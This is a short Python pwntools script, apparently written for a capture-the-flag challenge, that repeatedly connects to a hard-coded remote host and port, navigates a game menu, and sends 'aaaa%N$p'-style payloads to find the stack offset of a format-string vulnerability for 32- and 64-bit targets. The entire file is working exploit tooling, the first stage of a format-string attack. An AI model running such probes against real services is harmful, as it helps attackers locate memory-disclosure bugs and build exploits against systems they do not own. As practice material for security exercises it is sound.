from pwn import*

def fuzz_str_32(ip,port,menu_last,op):
	len=0
	while(1):
		len+=1
		log.info('try: length-->{}'.format(len))
		payload='aaaa'+('%'+str(len)+'$p')
		io=remote(ip,port)
		io.sendlineafter(menu_last,op)	#here is upon on problem
		io.sendline(payload)
		tmp=io.recv(14)
		if tmp==b'aaaa0x61616161':
			log.info('success: length-->{}'.format(len))
			break
		else:
			io.close()

def fuzz_str_64(ip,port,menu_last,op):
	len=0
	while(1):
		len+=1
		log.info('try: length-->{}'.format(len))
		payload='aaaaaaaa'+('%'+str(len)+'$p')
		io=remote(ip,port)
		io.sendlineafter(menu_last,op)	
		io.sendline(payload)
		tmp=io.recv(26)
		print(tmp)
		# pause()
		if tmp==b'aaaaaaaa0x6161616161616161':
			log.info('success: length-->{}'.format(len))
			break
		else:
			io.close()
			sleep(0.5)				# avoid nc too fast

if __name__ =='__main__':
	ip='61.147.171.105'					# input your ip
	port='50389'						# input your port
	menu_last='3. Exit the battle \n'			# here is upon on problem
	op='2'							# here is upon on problem
	fuzz_str_64(ip,port,menu_last,op)
	fuzz_str_32(ip,port,menu_last,op)

